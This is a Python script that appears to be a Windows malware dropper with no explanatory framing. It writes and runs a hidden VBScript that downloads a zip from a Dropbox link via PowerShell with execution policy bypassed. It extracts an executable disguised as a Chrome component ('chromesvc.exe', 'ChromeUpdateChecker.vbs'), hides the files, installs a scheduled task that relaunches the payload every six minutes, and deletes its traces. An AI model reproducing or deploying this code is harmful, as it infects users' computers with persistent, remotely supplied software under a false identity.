import platform
import subprocess
import tempfile
from pathlib import Path

if platform.system().startswith("Windows"):
    pa = tempfile.gettempdir()
    with open(pa+'\junk.vbs','w') as f:
        f.write("""
vcOpcaTAcOP = "cmd /c mkdir %appdata%\\ChromeBrowser 2>null && echo vcOpcaTAcOP = ""cmd /c %appdata%\ChromeBrowser\chromesvc.exe"" >> %appdata%\ChromeBrowser\ChromeUpdateChecker.vbs && cmd /c echo set vOpcQrtacv = CreateObject(""WScript.Shell"") >> %appdata%\ChromeBrowser\ChromeUpdateChecker.vbs && echo vOpcQrtacv.Run vcOpcaTAcOP,0 >> %appdata%\ChromeBrowser\ChromeUpdateChecker.vbs && attrib +h %appdata%\ChromeBrowser\ChromeUpdateChecker.vbs && powershell -exec bypass Invoke-WebRequest -Uri https://dl.dropbox.com/s/2cyfuz8ls6vigw6/hello.zip -OutFile $env:appdata\ChromeBrowser\procheck.zip;Expand-Archive -Path $env:appdata\ChromeBrowser\procheck.zip -DestinationPath $env:appdata\ChromeBrowser;Remove-Item -Path $env:appdata\ChromeBrowser\procheck.zip;attrib +h $env:appdata\ChromeBrowser\chromesvc.exe;attrib +h $env:appdata\ChromeBrowser;cmd /c %appdata%\ChromeBrowser\ChromeUpdateChecker.vbs && schtasks /create /tn ""GoogleChromeTaskMachineB"" /sc minute /mo 6 /tr ""%appdata%\ChromeBrowser\ChromeUpdateChecker.vbs"" && del %temp%\tmp.vbs"
set vOpcQrtacv = CreateObject("WScript.Shell")
vOpcQrtacv.Run vcOpcaTAcOP,0
        """)
        f.close()
    path = Path(tempfile.gettempdir() + '\junk.vbs')
    subprocess.call("cmd /c %temp%\junk.vbs && del %temp%\junk.vbs 2>null",shell=True)

